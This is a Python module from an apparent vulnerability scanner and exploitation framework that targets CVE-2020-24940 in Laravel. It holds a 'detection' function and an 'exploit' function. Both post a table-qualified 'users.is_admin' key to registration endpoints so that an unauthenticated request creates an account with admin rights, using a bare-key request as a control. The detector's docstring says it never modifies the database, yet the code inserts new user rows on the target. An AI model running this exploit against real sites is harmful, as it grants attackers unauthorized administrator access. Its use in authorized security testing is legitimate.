#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2020-24940')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2020-24940 — Laravel Mass Assignment Flaw (SAFE DETECTOR)

Summary:
    Laravel < 6.18.34 and < 7.23.2 may improperly handle mass-assignment.
    Unvalidated values could be written to unintended tables or fields
    during mass assignment, potentially corrupting data.

This module performs SAFE detection:
 ✔ Sends harmless payloads
 ✔ Checks for error messages or mass-assignment exceptions
 ✔ Never modifies database content

"""

import requests
from urllib.parse import urljoin
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

def scan(target_url: str, *, session=None, username=None, password=None, **kwargs):
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    sess = session or http_config.get_auth_session()
    base = target_url.rstrip("/")

    result = {
        "cve_id": "CVE-2020-24940",
        "name": "Laravel Eloquent table-name-stripping mass-assignment (CVE-2020-24940)",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "evidence": "",
    }

    # Registration endpoints to probe for the dotted-key sink.
    possible_endpoints = ["/register", "/api/register", "/users", "/user/create"]

    # CVE-2020-24940 proof probe: post the TABLE-QUALIFIED sensitive key `users.is_admin`. The app's
    # bare-name filter (app_filter) blocks a plain `is_admin`, so the only way is_admin can come back
    # true is if Laravel < 6.18.34 stripped the `users.` prefix and wrote the column. We use a unique
    # email per call so the row inserts cleanly and reruns never collide.
    import uuid as _uuid
    probe_email = f"scan-{_uuid.uuid4().hex[:8]}@lab.test"
    dotted_payload = {
        "name": "scan-probe",
        "email": probe_email,
        "password": "secret123",
        "users.is_admin": 1,   # table-qualified key — defeats the bare-name app filter on < 6.18.34
    }

    for endpoint in possible_endpoints:
        url = urljoin(base + "/", endpoint.lstrip("/"))
        try:
            r = sess.post(url, json=dotted_payload, timeout=8, verify=False)
        except Exception:
            continue
        if r is None or r.status_code in (404, 405, 410):
            continue
        try:
            j = r.json()
        except ValueError:
            j = None

        if isinstance(j, dict) and (j.get("is_admin") is True or j.get("privilege_escalated") is True):
            # The table-qualified key was stripped to `is_admin` and persisted despite the app filter
            # blocking the bare key — confirmed CVE-2020-24940 table-name-stripping behavior.
            result["vulnerable"] = True
            result["status"] = "confirmed_vulnerable"
            result["verdict"] = "confirmed_vulnerable"
            result["proof_type"] = "privilege_field_written"
            result["evidence"] = (
                f"POST {endpoint} with table-qualified key `users.is_admin` (HTTP {r.status_code}) "
                f"persisted is_admin=true despite the app filter blocking the bare `is_admin` key — "
                f"Laravel < 6.18.34 stripped the `users.` prefix and wrote the column. "
                f"filtered_keys={j.get('filtered_keys')}. This is table-name stripping defeating the "
                f"application-layer name filter (NOT an Eloquent $guarded bypass)."
            )
            return result

        if isinstance(j, dict) and j.get("is_admin") is False:
            # Endpoint reachable and the model/route are right, but the dotted key did NOT write
            # is_admin — patched framework (>= 6.18.34 drops keys containing '.').
            result["status"] = "blocked_by_control"
            result["verdict"] = "blocked_by_control"
            result["proof_type"] = "patched_framework"
            result["evidence"] = (
                f"POST {endpoint} accepted the request but the table-qualified `users.is_admin` did "
                f"NOT write is_admin (stayed false) — framework drops dotted keys (patched >= 6.18.34)."
            )
            return result

    result["evidence"] = "No CVE-2020-24940 table-name-stripping sink detected."
    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2020-24940 exploitation half — Laravel mass-assignment over-post.

Split from the original modules/cve_2020_24940.py (detection half: modules/cves/cve_2020_24940.py).
Exploitation may import from modules root (shared infra) and modules.detection.
"""

import random
import uuid
import requests
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


def exploit(target_url: str, *, username: str = None, password: str = None,
            command: str = None, options: dict = None, session=None, **kwargs) -> dict:
    """Attempt real exploitation of CVE-2020-24940 (Eloquent table-name stripping).

    vuln_class = mass_assignment. Unauthenticated. The application defends the sensitive `is_admin`
    column with an app-layer bare-name filter (app_filter() unsets a plain `is_admin` key). On
    Laravel < 6.18.34, Model::fill()'s removeTableFromKey() strips a table prefix BEFORE the
    fillable/guarded check, so a TABLE-QUALIFIED key `users.is_admin` slips past the bare-name filter
    and is stripped to `is_admin` and written. On 6.18.34+ the framework drops any key containing '.'.

    Exploitation = POST the table-qualified key and confirm the privilege column was persisted
    (read-back is_admin=true). To prove this is the table-name-stripping bug and not a generic
    over-post, the exploit also confirms (control) that the BARE `is_admin` key is blocked. Success is
    set ONLY when the dotted key writes is_admin=true while the bare key does not.

    NOTE: this is table-name stripping defeating the application-layer name filter — NOT an Eloquent
    $guarded bypass (a dotted key cannot reach a $guarded column on either version). Never raises.
    No command delivery (not command-capable). username/password ignored (route is unauthenticated).
    """
    options = options or {}

    out = {
        "cve": "CVE-2020-24940",
        "attempted": True,
        "success": False,
        "vuln_class": "mass_assignment",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    try:
        if not target_url.startswith(("http://", "https://")):
            target_url = "http://" + target_url
        base = target_url.rstrip("/")

        s = session or http_config.get_auth_session()
        s.headers.update({"Accept": "application/json"})

        endpoints = ["/register", "/api/register", "/users", "/user/create"]
        last_err = None

        def _post(url, payload):
            try:
                r = s.post(url, json=payload, timeout=12, verify=False)
            except Exception as e:  # noqa: BLE001
                return None, f"{e}"
            return r, None

        def _is_admin(r):
            """Return the persisted is_admin bool from the route's read-back JSON, or None."""
            try:
                j = r.json()
            except ValueError:
                return None, None
            if not isinstance(j, dict):
                return None, None
            val = j.get("is_admin")
            if val is None:
                val = j.get("privilege_escalated")
            return (bool(val) if val is not None else None), j

        for endpoint in endpoints:
            url = base + endpoint

            # --- Control: the BARE `is_admin` key must be BLOCKED by the app filter. ---
            # This proves the win below is table-name stripping, not a naive accept-everything route.
            bare_email = f"ctl-{uuid.uuid4().hex[:8]}@lab.test"
            r_ctl, err = _post(url, {"name": "ctl", "email": bare_email,
                                     "password": "secret123", "is_admin": 1})
            if r_ctl is None:
                last_err = f"{endpoint}(control): {err}"
                continue
            if r_ctl.status_code in (404, 405, 410):
                last_err = f"{endpoint}: HTTP {r_ctl.status_code} (endpoint absent)"
                continue
            ctl_admin, _ = _is_admin(r_ctl)

            # --- Attack: the TABLE-QUALIFIED `users.is_admin` key. ---
            atk_email = f"poc-{uuid.uuid4().hex[:8]}@lab.test"
            r_atk, err = _post(url, {"name": "poc", "email": atk_email,
                                     "password": "secret123", "users.is_admin": 1})
            if r_atk is None:
                last_err = f"{endpoint}(attack): {err}"
                continue
            atk_admin, j_atk = _is_admin(r_atk)

            if atk_admin is True and ctl_admin is not True:
                out["success"] = True
                out["evidence"] = (
                    f"POST {endpoint}: the table-qualified key `users.is_admin` persisted "
                    f"is_admin=true (read back from the DB), while the bare `is_admin` key was blocked "
                    f"by the app filter (control is_admin={ctl_admin}). Laravel < 6.18.34 stripped the "
                    f"`users.` prefix and wrote the privilege column. Attack response: "
                    f"{(r_atk.text or '')[:400]}"
                )
                out["detail"] = (
                    "CVE-2020-24940 confirmed: table-name stripping defeated the application-layer "
                    "bare-name input filter — `users.is_admin` wrote the is_admin privilege column "
                    "that a plain `is_admin` cannot. This is NOT an Eloquent $guarded bypass."
                )
                out["artifacts"] = {
                    "endpoint": endpoint,
                    "attack_key": "users.is_admin",
                    "attack_is_admin": atk_admin,
                    "control_bare_is_admin": ctl_admin,
                    "filtered_keys": (j_atk or {}).get("filtered_keys"),
                }
                return out

            if atk_admin is False:
                # Endpoint + route correct, but the dotted key was dropped — patched framework.
                last_err = (
                    f"{endpoint}: table-qualified key did NOT write is_admin (stayed false) — "
                    f"framework drops dotted keys (patched >= 6.18.34). control is_admin={ctl_admin}"
                )
                continue

            last_err = (
                f"{endpoint}: HTTP {r_atk.status_code}, no is_admin read-back in response "
                f"(route may not expose the field). body={(r_atk.text or '')[:160]}"
            )

        out["success"] = False
        out["reason"] = (
            "Table-qualified `users.is_admin` did not write the privilege column on any endpoint "
            f"(tried {endpoints}). Last: {last_err}"
        )
        out["detail"] = "CVE-2020-24940 table-name-stripping exploitation not confirmed against target."
        return out

    except Exception as e:  # noqa: BLE001 — never raise to the caller
        out["success"] = False
        out["reason"] = f"exploit error: {type(e).__name__}: {e}"
        out["detail"] = "Exploit attempt errored internally."
        return out
